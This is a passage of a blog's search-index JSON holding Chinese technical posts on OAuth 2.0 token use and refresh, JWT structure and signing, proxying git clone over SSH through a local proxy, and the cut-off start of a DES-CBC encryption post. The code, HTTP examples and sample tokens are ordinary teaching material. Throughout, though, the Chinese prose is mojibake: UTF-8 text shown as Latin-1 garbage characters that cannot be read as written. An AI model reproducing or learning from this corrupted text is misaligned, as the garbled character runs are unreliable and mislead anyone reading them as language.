application/json;charset=UTF-8\nCache-Control: no-store\nPragma: no-cache\n\n{\n\"access_token\":\"2YotnFZFEjr1zCsicMWpAA\",\n\"token_type\":\"example\",\n\"expires_in\":3600,\n\"example_parameter\":\"example_value\"\n}\n```\n\n\n\n# 3. ä½¿ç”¨\n\n### 3.1 ä»¤ç‰Œçš„ä½¿ç”¨\n\nA ç½‘ç«™æ‹¿åˆ°ä»¤ç‰Œä»¥åï¼Œå°±å¯ä»¥å‘ B ç½‘ç«™çš„ API è¯·æ±‚æ•°æ®äº†ã€‚\næ­¤æ—¶ï¼Œæ¯ä¸ªå‘åˆ° API çš„è¯·æ±‚ï¼Œéƒ½å¿…é¡»å¸¦æœ‰ä»¤ç‰Œã€‚å…·ä½“åšæ³•æ˜¯åœ¨è¯·æ±‚çš„å¤´ä¿¡æ¯ï¼ŒåŠ ä¸Šä¸€ä¸ªAuthorizationå­—æ®µï¼Œä»¤ç‰Œå°±æ”¾åœ¨è¿™ä¸ªå­—æ®µé‡Œé¢ã€‚\n\ncurl -H \"Authorization: Bearer ACCESS_TOKEN\" \"https://api.b.com\"\n\nä¸Šé¢å‘½ä»¤ä¸­ï¼ŒACCESS_TOKENå°±æ˜¯æ‹¿åˆ°çš„ä»¤ç‰Œã€‚\n\n\n\n### 3.2 æ›´æ–°ä»¤ç‰Œ\n\nå¦‚æœç”¨æˆ·è®¿é—®çš„æ—¶å€™ï¼Œå®¢æˆ·ç«¯çš„\"è®¿é—®ä»¤ç‰Œ\"å·²ç»è¿‡æœŸï¼Œåˆ™éœ€è¦ä½¿ç”¨\"æ›´æ–°ä»¤ç‰Œ\"ç”³è¯·ä¸€ä¸ªæ–°çš„è®¿é—®ä»¤ç‰Œã€‚\n\nå®¢æˆ·ç«¯å‘å‡ºæ›´æ–°ä»¤ç‰Œçš„HTTPè¯·æ±‚ï¼ŒåŒ…å«ä»¥ä¸‹å‚æ•°ï¼š\n\n- grant_typeï¼šè¡¨ç¤ºä½¿ç”¨çš„æˆæƒæ¨¡å¼ï¼Œæ­¤å¤„çš„å€¼å›ºå®šä¸º\"refresh_token\"ï¼Œå¿…é€‰é¡¹ã€‚\n- refresh_tokenï¼šè¡¨ç¤ºæ—©å‰æ”¶åˆ°çš„æ›´æ–°ä»¤ç‰Œï¼Œå¿…é€‰é¡¹ã€‚\n- scopeï¼šè¡¨ç¤ºç”³è¯·çš„æˆæƒèŒƒå›´ï¼Œä¸å¯ä»¥è¶…å‡ºä¸Šä¸€æ¬¡ç”³è¯·çš„èŒƒå›´ï¼Œå¦‚æœçœç•¥è¯¥å‚æ•°ï¼Œåˆ™è¡¨ç¤ºä¸ä¸Šä¸€æ¬¡ä¸€è‡´ã€‚\n\nä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚\n\n```http\nPOST /token HTTP/1.1\nHost: server.example.com\nAuthorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW\nContent-Type: application/x-www-form-urlencoded\n\ngrant_type=refresh_token&refresh_token=tGzv3JOkF0XG5Qx2TlKWIA\n```\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html\n+ https://www.ruanyifeng.com/blog/2019/04/github-oauth.html\n\n\n\n\n\n","tags":["http"],"categories":["web"]},{"title":"åŸºäºjwtçš„tokenè®¤è¯","url":"%2Fp%2F722ed7e7.html","content":"\nJSON Web Tokenï¼ˆç¼©å†™ JWTï¼‰æ˜¯ç›®å‰æœ€æµè¡Œçš„**è·¨åŸŸè®¤è¯è§£å†³æ–¹æ¡ˆ**ã€‚\n\n<!-- more -->\n\n# 1. tokenè®¤è¯\n\nå½“ç”¨æˆ·æˆåŠŸç™»é™†ç³»ç»Ÿå¹¶æˆåŠŸéªŒè¯æœ‰æ•ˆä¹‹åï¼ŒæœåŠ¡å™¨ä¼šåˆ©ç”¨æŸç§æœºåˆ¶äº§ç”Ÿä¸€ä¸ªtokenå­—ç¬¦ä¸²ï¼Œè¿™ä¸ªtokenä¸­å¯ä»¥åŒ…å«å¾ˆå¤šä¿¡æ¯ï¼Œä¾‹å¦‚æ¥æºIPï¼Œè¿‡æœŸæ—¶é—´ï¼Œç”¨æˆ·ä¿¡æ¯ç­‰ï¼Œ æŠŠè¿™ä¸ªå­—ç¬¦ä¸²ä¸‹å‘ç»™å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯åœ¨ä¹‹åçš„æ¯æ¬¡è¯·æ±‚ä¸­éƒ½æºå¸¦ç€è¿™ä¸ªtokenï¼Œæºå¸¦æ–¹å¼å…¶å®å¾ˆè‡ªç”±ï¼Œæ— è®ºæ˜¯cookieæ–¹å¼è¿˜æ˜¯å…¶ä»–æ–¹å¼éƒ½å¯ä»¥ã€‚å½“æœåŠ¡ç«¯æ”¶åˆ°è¯·æ±‚ï¼Œå–å‡ºtokenè¿›è¡ŒéªŒè¯ï¼ˆå¯ä»¥éªŒè¯æ¥æºipï¼Œè¿‡æœŸæ—¶é—´ç­‰ä¿¡æ¯ï¼‰ï¼Œå¦‚æœåˆæ³•åˆ™å…è®¸è¿›è¡Œæ“ä½œã€‚\n\n### 1.1 ä¼˜ç‚¹\n\n1. æ”¯æŒè·¨åŸŸè®¿é—®ï¼šCookieæ˜¯ä¸å…è®¸å®åŸŸè®¿é—®çš„ï¼Œè¿™ä¸€ç‚¹å¯¹Tokenæœºåˆ¶æ˜¯ä¸å­˜åœ¨çš„ï¼Œå‰ææ˜¯ä¼ è¾“çš„ç”¨æˆ·è®¤è¯ä¿¡æ¯é€šè¿‡HTTPå¤´ä¼ è¾“ã€‚\n2. æ— çŠ¶æ€: Tokenæœºåˆ¶åœ¨æœåŠ¡ç«¯ä¸éœ€è¦å­˜å‚¨sessionä¿¡æ¯ï¼Œå› ä¸ºTokenè‡ªèº«åŒ…å«äº†æ‰€æœ‰ç™»å½•ç”¨æˆ·çš„ä¿¡æ¯ï¼Œåªéœ€è¦åœ¨å®¢æˆ·ç«¯çš„cookieæˆ–æœ¬åœ°ä»‹è´¨å­˜å‚¨çŠ¶æ€ä¿¡æ¯ã€‚\n3. è§£è€¦ï¼šä¸éœ€è¦ç»‘å®šåˆ°ä¸€ä¸ªç‰¹å®šçš„èº«ä»½éªŒè¯æ–¹æ¡ˆã€‚Tokenå¯ä»¥åœ¨ä»»ä½•åœ°æ–¹ç”Ÿæˆï¼Œåªè¦åœ¨ä½ çš„APIè¢«è°ƒç”¨çš„æ—¶å€™ï¼Œä½ å¯ä»¥è¿›è¡ŒTokenç”Ÿæˆè°ƒç”¨å³å¯.\n4. é€‚ç”¨æ€§æ›´å¹¿ï¼šåªè¦æ˜¯æ”¯æŒhttpåè®®çš„å®¢æˆ·ç«¯ï¼Œå°±å¯ä»¥ä½¿ç”¨tokenè®¤è¯ã€‚\n5. æœåŠ¡ç«¯åªéœ€è¦éªŒè¯tokençš„å®‰å…¨ï¼Œä¸å¿…å†å»è·å–ç™»å½•ç”¨æˆ·ä¿¡æ¯ï¼Œå› ä¸ºç”¨æˆ·çš„ç™»å½•ä¿¡æ¯å·²ç»åœ¨tokenä¿¡æ¯ä¸­ã€‚\n6. åŸºäºæ ‡å‡†åŒ–ï¼šä½ çš„APIå¯ä»¥é‡‡ç”¨æ ‡å‡†åŒ–çš„ JSON Web Token (JWT). \n\n### 1.2 ç¼ºç‚¹\n\n1. ç½‘ç»œä¼ è¾“çš„æ•°æ®é‡å¢å¤§ï¼šç”±äºtokenä¸­å­˜å‚¨äº†å¤§é‡çš„ç”¨æˆ·å’Œå®‰å…¨ç›¸å…³çš„ä¿¡æ¯ï¼Œæ‰€ä»¥æ¯”å•çº¯çš„cookieä¿¡æ¯(ä¾‹å¦‚session_id)è¦å¤§å¾ˆå¤šï¼Œä¼ è¾“è¿‡ç¨‹ä¸­éœ€è¦æ¶ˆè€—æ›´å¤šæµé‡ï¼Œå ç”¨æ›´å¤šå¸¦å®½ï¼Œ\n2. å’Œæ‰€æœ‰çš„å®¢æˆ·ç«¯è®¤è¯æ–¹å¼ä¸€æ ·ï¼Œå¦‚æœæƒ³è¦åœ¨æœåŠ¡ç«¯æ§åˆ¶tokençš„æ³¨é”€æœ‰éš¾åº¦ï¼Œè€Œä¸”ä¹Ÿå¾ˆéš¾è§£å†³å®¢æˆ·ç«¯çš„åŠ«æŒé—®é¢˜ã€‚\n3. ç”±äºtokenä¿¡æ¯åœ¨æœåŠ¡ç«¯å¢åŠ äº†ä¸€æ¬¡éªŒè¯æ•°æ®å®Œæ•´æ€§çš„æ“ä½œï¼Œæ‰€ä»¥æ¯”sessionçš„è®¤è¯æ–¹å¼å¢åŠ äº†cpuçš„å¼€é”€ã€‚\n\nä½†æ˜¯æ•´ä½“æ¥çœ‹ï¼ŒåŸºäºtokençš„è®¤è¯æ–¹å¼è¿˜æ˜¯æ¯”sessionå’Œcookieæ–¹å¼è¦æœ‰å¾ˆå¤§ä¼˜åŠ¿ã€‚åœ¨æ‰€çŸ¥çš„tokenè®¤è¯ä¸­ï¼Œjwtæ˜¯ä¸€ç§ä¼˜ç§€çš„è§£å†³æ–¹æ¡ˆã€‚\n\n\n\n# 2. jwtç»“æ„\n\nJSON Web Token (JWT)æ˜¯ä¸€ä¸ªå¼€æ”¾æ ‡å‡†(RFC 7519)ï¼Œå®ƒå®šä¹‰äº†ä¸€ç§ç´§å‡‘çš„ã€è‡ªåŒ…å«çš„æ–¹å¼ï¼Œç”¨äºä½œä¸ºJSONå¯¹è±¡åœ¨å„æ–¹ä¹‹é—´å®‰å…¨åœ°ä¼ è¾“ä¿¡æ¯ã€‚è¯¥ä¿¡æ¯å¯ä»¥è¢«éªŒè¯å’Œä¿¡ä»»ï¼Œå› ä¸ºå®ƒæ˜¯æ•°å­—ç­¾åçš„ã€‚\n\nä¸€ä¸ªJWTå®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå®ƒç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼Œå¤´éƒ¨ã€è½½è·ä¸ç­¾åã€‚ä¸­é—´ç”¨ç‚¹ï¼ˆ`.`ï¼‰åˆ†éš”æˆä¸‰ä¸ªéƒ¨åˆ†ã€‚æ³¨æ„JWT å†…éƒ¨æ˜¯æ²¡æœ‰æ¢è¡Œçš„ã€‚\n\n![img](åŸºäºjwtçš„tokenè®¤è¯/bg2018072303.jpg)\n\n\n\n### 2.1 å¤´éƒ¨\n\nheaderå…¸å‹çš„ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼štokençš„ç±»å‹ï¼ˆâ€œJWTâ€ï¼‰å’Œç®—æ³•åç§°ï¼ˆæ¯”å¦‚ï¼šHMAC SHA256æˆ–è€…RSAç­‰ç­‰ï¼‰ã€‚\n\n```json\n{\n  \"alg\": \"HS256\",\n  \"typ\": \"JWT\"\n}\n```\n\nå°†ä¸Šé¢çš„å†…å®¹è¿›è¡Œbase64ç¼–ç ,å¯ä»¥å¾—åˆ°æˆ‘ä»¬JWTçš„å¤´éƒ¨,ç¼–ç åå¦‚ä¸‹:\n\n```\newogICJhbGciOiAiSFMyNTYiLAogICJ0eXAiOiAiSldUIgp9ICA=\n```\n\n\n\n### 2.2 Payload\n\nPayload éƒ¨åˆ†ä¹Ÿæ˜¯ä¸€ä¸ªJSONå¯¹è±¡ï¼Œç”¨æ¥å­˜æ”¾å®é™…éœ€è¦ä¼ é€’çš„æ•°æ®ã€‚JWT è§„å®šäº†7ä¸ªå®˜æ–¹å­—æ®µï¼Œä¾›é€‰ç”¨ã€‚\n\n```erlang\niss (issuer)ï¼šè¯¥JWTçš„ç­¾å‘è€…\nexp (expiration time)ï¼šä»€ä¹ˆæ—¶å€™è¿‡æœŸï¼Œè¿™é‡Œæ˜¯ä¸€ä¸ªUnixæ—¶é—´æˆ³\nsub (subject)ï¼šè¯¥JWTæ‰€é¢å‘çš„ç”¨æˆ·\naud (audience)ï¼šæ¥æ”¶è¯¥JWTçš„ä¸€æ–¹\nnbf (Not Before)ï¼šç”Ÿæ•ˆæ—¶é—´\niat (Issued At)ï¼šåœ¨ä»€ä¹ˆæ—¶å€™ç­¾å‘çš„\njti (JWT ID)ï¼šç¼–å·\n```\n\né™¤äº†ä»¥ä¸Šå­—æ®µä¹‹å¤–ï¼Œä½ å®Œå…¨å¯ä»¥æ·»åŠ è‡ªå·±æƒ³è¦çš„ä»»ä½•å­—æ®µï¼Œè¿™é‡Œè¿˜æ˜¯æé†’ä¸€ä¸‹ï¼Œç”±äºjwtçš„æ ‡å‡†ï¼Œä¿¡æ¯æ˜¯ä¸åŠ å¯†çš„ï¼Œæ‰€ä»¥ä¸€äº›æ•æ„Ÿä¿¡æ¯æœ€å¥½ä¸è¦æ·»åŠ åˆ°jsoné‡Œé¢\n\n```json\n{\n    \"iss\": \"liuvv.com\",\n    \"iat\": 1500218077,\n    \"exp\": 1500218077,\n    \"aud\": \"www.liuvv.com\",\n    \"sub\": \"1@liuvv.com\",\n    \"user_id\": \"dc2c4eefe2d141490b6ca612e252f92e\",\n    \"user_token\": \"09f7f25cdb003699cee05759e7934fb2\"\n}\n```\n\nç°åœ¨æˆ‘ä»¬éœ€è¦å°†è´Ÿè½½è¿™æ•´ä¸ªéƒ¨åˆ†è¿›è¡Œbase64ç¼–ç ,ç¼–ç åç»“æœå¦‚ä¸‹:\n\n```\newogICAgImlzcyI6ICJMZWZ0by5jb20iLAogICAgImlhdCI6IDE1MDAyMTgwNzcsCiAgICAiZXhwIjogMTUwMDIxODA3NywKICAgICJhdWQiOiAid3d3LmxlZnRzby5jb20iLAogICAgInN1YiI6ICJsZWZ0c29AcXEuY29tIiwKICAgICJ1c2VyX2lkIjogImRjMmM0ZWVmZTJkMTQxNDkwYjZjYTYxMmUyNTJmOTJlIiwKICAgICJ1c2VyX3Rva2VuIjogIjA5ZjdmMjVjZGIwMDM2OTljZWUwNTc1OWU3OTM0ZmIyIgp9\n```\n\n\n\n### 2.3 Signature\n\nä¸ºäº†å¾—åˆ°ç­¾åéƒ¨åˆ†ï¼Œä½ å¿…é¡»æœ‰ç¼–ç è¿‡çš„headerã€ç¼–ç è¿‡çš„payloadã€ä¸€ä¸ªç§˜é’¥ï¼ˆè¿™ä¸ªç§˜é’¥åªæœ‰æœåŠ¡ç«¯çŸ¥é“ï¼‰ï¼Œç­¾åç®—æ³•æ˜¯headerä¸­æŒ‡å®šçš„é‚£ä¸ªï¼Œç„¶å¯¹å®ƒä»¬ç­¾åå³å¯ã€‚\n\n```js\nHMACSHA256(base64UrlEncode(header) + \".\" + base64UrlEncode(payload), secret)\n```\n\n\n\né¦–å…ˆéœ€è¦å°†å¤´éƒ¨å’Œè´Ÿè½½é€šè¿‡.é“¾æ¥èµ·æ¥å°±åƒè¿™æ ·:header.Payload,ä¸Šè¿°çš„ä¾‹å­é“¾æ¥èµ·æ¥ä¹‹åå°±æ˜¯è¿™æ ·çš„:\n\n```\newogICJhbGciOiAiSFMyNTYiLAogICJ0eXAiOiAiSldUIgp9ICA=.ewogICAgImlzcyI6ICJMZWZ0by5jb20iLAogICAgImlhdCI6IDE1MDAyMTgwNzcsCiAgICAiZXhwIjogMTUwMDIxODA3NywKICAgICJhdWQiOiAid3d3LmxlZnRzby5jb20iLAogICAgInN1YiI6ICJsZWZ0c29AcXEuY29tIiwKICAgICJ1c2VyX2lkIjogImRjMmM0ZWVmZTJkMTQxNDkwYjZjYTYxMmUyNTJmOTJlIiwKICAgICJ1c2VyX3Rva2VuIjogIjA5ZjdmMjVjZGIwMDM2OTljZWUwNTc1OWU3OTM0ZmIyIgp9\n```\n\nç”±äºHMacSHA256åŠ å¯†ç®—æ³•éœ€è¦ä¸€ä¸ªkey,æˆ‘ä»¬è¿™é‡Œkeyæš‚æ—¶ç”¨liuvvå§\n\nåŠ å¯†åçš„å†…å®¹ä¸º:\n\n```\n686855c578362e762248f22e2cc1213dc7a6aff8ebda52247780eb6b5ae91877\n```\n\nå¯¹ä¸Šé¢çš„ç­¾åå†…å®¹è¿›è¡Œbase64ç¼–ç å¾—åˆ°æœ€ç»ˆçš„ç­¾å\n\n```\nNjg2ODU1YzU3ODM2MmU3NjIyNDhmMjJlMmNjMTIxM2RjN2E2YWZmOGViZGE1MjI0Nzc4MGViNmI1YWU5MTg3Nw==\n```\n\næœ€ç»ˆçš„JWTï¼š\n\n```\newogICJhbGciOiAiSFMyNTYiLAogICJ0eXAiOiAiSldUIgp9ICA=.ewogICAgImlzcyI6ICJMZWZ0by5jb20iLAogICAgImlhdCI6IDE1MDAyMTgwNzcsCiAgICAiZXhwIjogMTUwMDIxODA3NywKICAgICJhdWQiOiAid3d3LmxlZnRzby5jb20iLAogICAgInN1YiI6ICJsZWZ0c29AcXEuY29tIiwKICAgICJ1c2VyX2lkIjogImRjMmM0ZWVmZTJkMTQxNDkwYjZjYTYxMmUyNTJmOTJlIiwKICAgICJ1c2VyX3Rva2VuIjogIjA5ZjdmMjVjZGIwMDM2OTljZWUwNTc1OWU3OTM0ZmIyIgp9.Njg2ODU1YzU3ODM2MmU3NjIyNDhmMjJlMmNjMTIxM2RjN2E2YWZmOGViZGE1MjI0Nzc4MGViNmI1YWU5MTg3Nw==\n```\n\nå¯ä»¥åœ¨çº¿ç©ç©ï¼šhttps://www.bejson.com/jwt/\n\n# 3. jwtä½¿ç”¨\n\n### 3.1 æµç¨‹\n\n1. å®¢æˆ·ç«¯æºå¸¦ç”¨æˆ·çš„ç™»å½•å‡­è¯ï¼ˆä¸€èˆ¬ä¸ºç”¨æˆ·åå¯†ç ï¼‰æäº¤è¯·æ±‚ã€‚\n2. æœåŠ¡ç«¯æ”¶åˆ°ç™»å½•è¯·æ±‚ï¼ŒéªŒè¯å‡­è¯æ­£ç¡®æ€§ï¼Œå¦‚æœæ­£ç¡®åˆ™æŒ‰ç…§åè®®è§„å®šç”Ÿæˆtokenä¿¡æ¯ï¼Œç»è¿‡ç­¾åå¹¶è¿”å›ç»™å®¢æˆ·ç«¯ã€‚\n3. å®¢æˆ·ç«¯æ”¶åˆ°tokenä¿¡æ¯ï¼Œå¯ä»¥ä¿å­˜åœ¨cookieæˆ–è€…å…¶ä»–åœ°æ–¹ï¼Œä»¥åæ¯æ¬¡è¯·æ±‚çš„æ—¶å€™éƒ½æºå¸¦ä¸Štokenä¿¡æ¯ã€‚\n4. ä¸šåŠ¡æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚ï¼ŒéªŒè¯tokençš„æ­£ç¡®æ€§ï¼Œå¦‚æœæ­£ç¡®åˆ™è¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œã€‚\n\n![image](åŸºäºjwtçš„tokenè®¤è¯/1460000023870648.jpeg)\n\n### 3.2 äº¤äº’\n\nå®¢æˆ·ç«¯æ”¶åˆ°æœåŠ¡å™¨è¿”å›çš„ JWTï¼Œå¯ä»¥å‚¨å­˜åœ¨ Cookie é‡Œé¢ï¼Œä¹Ÿå¯ä»¥å‚¨å­˜åœ¨ localStorageã€‚æ­¤åï¼Œå®¢æˆ·ç«¯æ¯æ¬¡ä¸æœåŠ¡å™¨é€šä¿¡ï¼Œéƒ½è¦å¸¦ä¸Šè¿™ä¸ª JWTã€‚\n\nä½ å¯ä»¥æŠŠå®ƒæ”¾åœ¨ Cookie é‡Œé¢è‡ªåŠ¨å‘é€ï¼Œä½†æ˜¯è¿™æ ·ä¸èƒ½è·¨åŸŸï¼Œæ‰€ä»¥æ›´å¥½çš„åšæ³•æ˜¯æ”¾åœ¨ HTTP è¯·æ±‚çš„å¤´ä¿¡æ¯Authorizationå­—æ®µé‡Œé¢ã€‚\n\n```js\nAuthorization: Bearer <token>\n\nfetch('api/user/1', {\n  headers: {\n    'Authorization': 'Bearer ' + token\n  }\n})\n```\n\n### 3.3 ç‰¹ç‚¹\n\nï¼ˆ1ï¼‰JWT é»˜è®¤æ˜¯ä¸åŠ å¯†ï¼Œä½†ä¹Ÿæ˜¯å¯ä»¥åŠ å¯†çš„ã€‚ç”ŸæˆåŸå§‹ Token ä»¥åï¼Œå¯ä»¥ç”¨å¯†é’¥å†åŠ å¯†ä¸€æ¬¡ã€‚\nï¼ˆ2ï¼‰JWT ä¸åŠ å¯†çš„æƒ…å†µä¸‹ï¼Œä¸èƒ½å°†ç§˜å¯†æ•°æ®å†™å…¥ JWTã€‚\nï¼ˆ3ï¼‰JWT ä¸ä»…å¯ä»¥ç”¨äºè®¤è¯ï¼Œä¹Ÿå¯ä»¥ç”¨äºäº¤æ¢ä¿¡æ¯ã€‚æœ‰æ•ˆä½¿ç”¨ JWTï¼Œå¯ä»¥é™ä½æœåŠ¡å™¨æŸ¥è¯¢æ•°æ®åº“çš„æ¬¡æ•°ã€‚\nï¼ˆ4ï¼‰JWT çš„æœ€å¤§ç¼ºç‚¹æ˜¯ï¼Œç”±äºæœåŠ¡å™¨ä¸ä¿å­˜ session çŠ¶æ€ï¼Œå› æ­¤æ— æ³•åœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­åºŸæ­¢æŸä¸ª tokenï¼Œæˆ–è€…æ›´æ”¹ token çš„æƒé™ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€æ—¦ JWT ç­¾å‘äº†ï¼Œåœ¨åˆ°æœŸä¹‹å‰å°±ä¼šå§‹ç»ˆæœ‰æ•ˆï¼Œé™¤éæœåŠ¡å™¨éƒ¨ç½²é¢å¤–çš„é€»è¾‘ã€‚\nï¼ˆ5ï¼‰JWT æœ¬èº«åŒ…å«äº†è®¤è¯ä¿¡æ¯ï¼Œä¸€æ—¦æ³„éœ²ï¼Œä»»ä½•äººéƒ½å¯ä»¥è·å¾—è¯¥ä»¤ç‰Œçš„æ‰€æœ‰æƒé™ã€‚ä¸ºäº†å‡å°‘ç›—ç”¨ï¼ŒJWT çš„æœ‰æ•ˆæœŸåº”è¯¥è®¾ç½®å¾—æ¯”è¾ƒçŸ­ã€‚å¯¹äºä¸€äº›æ¯”è¾ƒé‡è¦çš„æƒé™ï¼Œä½¿ç”¨æ—¶åº”è¯¥å†æ¬¡å¯¹ç”¨æˆ·è¿›è¡Œè®¤è¯ã€‚\nï¼ˆ6ï¼‰ä¸ºäº†å‡å°‘ç›—ç”¨ï¼ŒJWT ä¸åº”è¯¥ä½¿ç”¨ HTTP åè®®æ˜ç ä¼ è¾“ï¼Œè¦ä½¿ç”¨ HTTPS åè®®ä¼ è¾“ã€‚\n\n### 3.4 é—®é¢˜\n\n1. ç”¨æˆ·ç™»å‡ºï¼Œå¦‚ä½•è®¾ç½®tokenæ— æ•ˆï¼Ÿ\n   + ç”¨æˆ·ç™»å‡ºï¼Œæµè§ˆå™¨ç«¯ä¸¢å¼ƒtoken\n   + ä½¿ç”¨redisæ•°æ®åº“ï¼Œç”¨æˆ·ç™»å‡ºï¼Œä»redisä¸­åˆ é™¤å¯¹åº”çš„token,è¯·æ±‚è®¿é—®æ—¶ï¼Œéœ€è¦ä»redisåº“ä¸­å–å‡ºå¯¹åº”çš„token,è‹¥æ²¡æœ‰ï¼Œåˆ™è¡¨æ˜å·²ç»ç™»å‡º\n\n2. ä¸¤ä¸ªä¸åŒçš„è®¾å¤‡ï¼Œä¸€ä¸ªè®¾å¤‡ç™»å‡ºï¼Œå¦å¤–ä¸€ä¸ªè®¾å¤‡å¦‚ä½•å¤„ç†ï¼Ÿ\n   + æœåŠ¡å™¨ç»´æŠ¤ä¸€ä¸ªæ¸…å•ï¼ˆè®°å½•è¯¥è´¦å·æ˜¯å¦å·²ç»ç­¾å‘tokenï¼‰ï¼Œè¿™æ ·åˆå›åˆ°sessionçš„è€è·¯äº†\n   + æ¯ä¸€ä¸ªè®¾å¤‡ä¸ç”¨æˆ·ç”Ÿæˆå”¯ä¸€çš„key,ä¿å­˜åœ¨redisä¸­ï¼Œå³è®¾å¤‡1çš„ç”¨æˆ·ç™»å‡ºï¼Œåªåˆ é™¤å¯¹åº”çš„tokenï¼Œè®¾å¤‡2çš„tokenä»ç„¶å­˜åœ¨\n   + æœåŠ¡å™¨ç«¯ç»´æŠ¤ä¸€ä¸ªç‰ˆæœ¬å·ï¼Œç›¸åŒç”¨æˆ·ä¸åŒè®¾å¤‡ç™»å…¥ï¼Œç‰ˆæœ¬å·åŠ 1ï¼Œè¿™æ ·ä¿æŒkeyçš„å”¯ä¸€æ€§ï¼ˆå’Œä¸Šé¢å·®ä¸å¤šï¼‰\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html","tags":["http"],"categories":["web"]},{"title":"è§£å†³git clone githubä¸‹è½½æ…¢é¾Ÿé€Ÿçš„é—®é¢˜","url":"%2Fp%2F94e659ca.html","content":"\ngithub åœ¨å®¶å¤©å¤©ä¸‹è½½åå‡ k, å¿ä½ å¥½ä¹…äº†, å®åœ¨æ˜¯å¿ä¸äº†äº†..\n\n<!-- more -->\n\n# 1. è§£å†³æ–¹æ¡ˆ\n\n### 1.1 ä»£ç†(æœ€å®ç”¨)\n\nå¤åˆ¶ clashX çš„ç»ˆç«¯ä»£ç†å‘½ä»¤, å¤åˆ¶ä¸€èˆ¬å¦‚ä¸‹: \n\n```bash\nexport https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7890\n```\n\nç„¶è€Œå‘ç°æ²¡æœ‰ä»€ä¹ˆåµç”¨, è¿˜æ˜¯10å‡  k. \n\næœ€åæ‰å‘ç°æˆ‘çš„ git clone éƒ½æ˜¯ç”¨çš„ ssh åè®®,  è™½ç„¶è®¾ç½®äº† https ä»£ç†, ä½† git clone git@github.com æ²¡ç”¨ã€‚å› ä¸º ssh ä¸èµ° https!!!!\n\næ­£ç¡®çš„æ–¹æ¡ˆæ˜¯èµ° ssh ä»£ç†!!!\n\n`vi ~/.ssh/config`\n\n```bash\nHost github.com\n        HostName github.com\n        IdentityFile ~/.ssh/github-unix2dos\n        User unix2dos\n        ProxyCommand nc -v -x 127.0.0.1:7890 %h %p\n```\n\n\n\n### 1.2 å¢å¼ºæ¨¡å¼\n\nhttps://install.appcenter.ms/users/clashx/apps/clashx-pro/distribution_groups/public \n\nå®‰è£… clashx pro ç‰ˆæœ¬ã€‚æ‰“å¼€å¢å¼ºæ¨¡å¼ å°±å¯ä»¥ç›´æ¥ä»£ç†å‘½ä»¤è¡Œäº†.\n\nç³»ç»Ÿæ‰€æœ‰æµé‡ç»è¿‡ clashï¼Œå¯¹è½¯ä»¶é€æ˜.\n\n\n\n### 1.3 å‡å°‘æ‹‰å–\n\nå¦‚æœ æ‹‰å– GitHub é¡¹ç›®ä»…ä»…æ˜¯æŸ¥çœ‹ï¼Œå¯ä»¥åŠ ä¸Š --depth=1 å‚æ•°ã€‚\n\ndepthç”¨äºæŒ‡å®šå…‹éš†æ·±åº¦ï¼Œä¸º1å³è¡¨ç¤ºåªå…‹éš†æœ€è¿‘ä¸€æ¬¡commit.\n\n```bash\ngit clone --depth 1 https://github.com/unix2dos/unix2dos.git\n```\n\nè¿™ç§æ–¹æ³•å…‹éš†çš„é¡¹ç›®åªåŒ…å«æœ€è¿‘çš„ä¸€æ¬¡commitçš„ä¸€ä¸ªåˆ†æ”¯ï¼Œä½“ç§¯å¾ˆå°ï¼Œå³å¯è§£å†³é¡¹ç›®è¿‡å¤§å¯¼è‡´Timeoutçš„é—®é¢˜ï¼Œä½†ä¼šäº§ç”Ÿå¦å¤–ä¸€ä¸ªé—®é¢˜ï¼Œä»–åªä¼šæŠŠé»˜è®¤åˆ†æ”¯cloneä¸‹æ¥ï¼Œå…¶ä»–è¿œç¨‹åˆ†æ”¯å¹¶ä¸åœ¨æœ¬åœ°.\n\n```bash\ngit clone -b ${branch} --depth=1 #å¯ä»¥æ‹‰å¯¹åº”åˆ†æ”¯\n```\n\n\n\n### 1.4 chrome æ’ä»¶\n\n https://github.com/fhefh2015/Fast-GitHub\n\nå›½å†…Githubä¸‹è½½å¾ˆæ…¢ï¼Œç”¨ä¸Šäº†è¿™ä¸ªæ’ä»¶åï¼Œä¸‹è½½é€Ÿåº¦å—–å—–å—–çš„~ï¼\n\nå…¶å®è‡ªå·±æµ‹è¯•åå‘ç°, ä¹Ÿæ²¡æœ‰å‘ç°å¾ˆå¿«..\n\n\n\n# 2. å‚è€ƒèµ„æ–™\n\n+ https://v2ex.com/t/730171\n+ https://github.com/fhefh2015/Fast-GitHub\n\n","tags":["github"],"categories":["git"]},{"title":"desåŠ è§£å¯†cbcæ¨¡å¼golangå’Œjavascriptçš„å®ç°","url":"%2Fp%2F8b88eb3d.html","content":"\n# 1. ä»‹ç»\n\n### 1.1 å¯¹ç§°åŠ å¯†ç®—æ³•\n\n+ DESï¼šDES å…¨ç§° Data Encryption Standardï¼Œæ˜¯ä¸€ç§ä½¿ç”¨å¯†é’¥åŠ å¯†çš„å—ç®—æ³•ã€‚ç°åœ¨è®¤ä¸ºæ˜¯ä¸€ç§ä¸å®‰å…¨çš„åŠ å¯†ç®—æ³•ï¼Œå› ä¸ºç°åœ¨å·²ç»æœ‰ç”¨ç©·ä¸¾æ³•æ”»ç ´ DES å¯†ç çš„æŠ¥é“äº†ã€‚\n\n+ 3DESï¼ˆæˆ–ç§°ä¸º Triple DESï¼‰æ˜¯ä¸‰é‡æ•°æ®åŠ å¯†ç®—æ³•ï¼ˆTDEAï¼ŒTriple Data Encryption Algorithmï¼‰å—å¯†ç çš„é€šç§°ã€‚å®ƒç›¸å½“äºæ˜¯å¯¹æ¯ä¸ªæ•°æ®å—åº”ç”¨ä¸‰æ¬¡ DES åŠ 